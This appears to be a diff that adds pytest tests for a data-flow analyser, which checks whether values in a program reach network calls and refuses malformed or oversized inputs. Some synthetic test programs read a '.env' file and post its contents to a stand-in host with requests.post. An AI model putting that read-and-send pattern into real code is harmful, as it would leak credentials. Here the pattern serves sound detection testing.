@@ -134,3 +134,31 @@ def test_source_identity_and_no_modification_of_the_program():
 def test_constructor_specific_read_methods_refuse_impossible_programs(constructor,method,filename):
     subject = f'import requests\nfrom pathlib import Path\nvalue={constructor}({filename!r}).{method}()\nrequests.post("https://example.invalid",data=value)'
     with pytest.raises(CorpusError): f.observe(subject)
+
+
+@pytest.mark.parametrize('keyword', ['data', 'json', 'timeout'])
+@pytest.mark.parametrize('read', ['Path(".env").read_text()', '"ordinary"'])
+def test_duplicate_keywords_never_report_flow_or_negative_for_impossible_program(keyword, read):
+    subject = PREFIX + f'secret={read}\nrequests.post("https://example.invalid",{keyword}=secret,{keyword}="ordinary")'
+    with pytest.raises(SyntaxError): compile(subject, '<synthetic duplicate keyword>', 'exec')
+    with pytest.raises(CorpusError): f.observe(subject)
+
+
+def test_literal_doubling_refuses_before_building_an_oversized_value(monkeypatch):
+    original = f.Value
+    lengths = []
+    class Tracked(original):
+        def __init__(self, sources=(), literal=None):
+            if isinstance(literal, str): lengths.append(len(literal))
+            super().__init__(sources, literal)
+    monkeypatch.setattr(f, 'Value', Tracked)
+    program = 'a="x"\n' + 'a=a+a\n' * 17
+    assert len(program) < f.MAX_CHARACTERS
+    with pytest.raises(CorpusError): f.observe(program)
+    assert max(lengths) <= f.MAX_CHARACTERS
+
+
+def test_supported_literal_concatenation_at_limit_stays_available():
+    # Inputs stay below8,000 characters while the propagated value reaches it.
+    program = 'a="' + 'x' * 4000 + '"\na=a+a\n'
+    assert f.observe(program)['state'] == 'NO_SUPPORTED_FLOW'
